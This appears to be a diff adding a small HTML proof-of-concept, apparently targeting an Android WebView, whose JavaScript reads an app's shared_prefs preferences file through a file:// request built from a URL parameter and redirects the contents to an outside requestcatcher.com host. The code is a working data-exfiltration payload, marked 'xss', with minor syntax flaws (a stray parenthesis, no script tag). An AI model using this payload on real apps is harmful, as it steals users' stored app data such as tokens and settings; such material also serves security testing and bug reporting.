@@ -1,0 +1,17 @@
+<html>
+  <body>
+
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        window.location = "https://rokikuchbh.requestcatcher.com/a?a=" + xhr.responseText);
+    }
+}
+
+var aa = new URL(window.location.href).searchParams.get("aa");
+// xss
+xhr.open('GET', 'file:///data/data/' + aa + '/shared_prefs/' + aa + `_preferences.xml`, true);
+xhr.send(null);
+    
+  </body>
+</html>
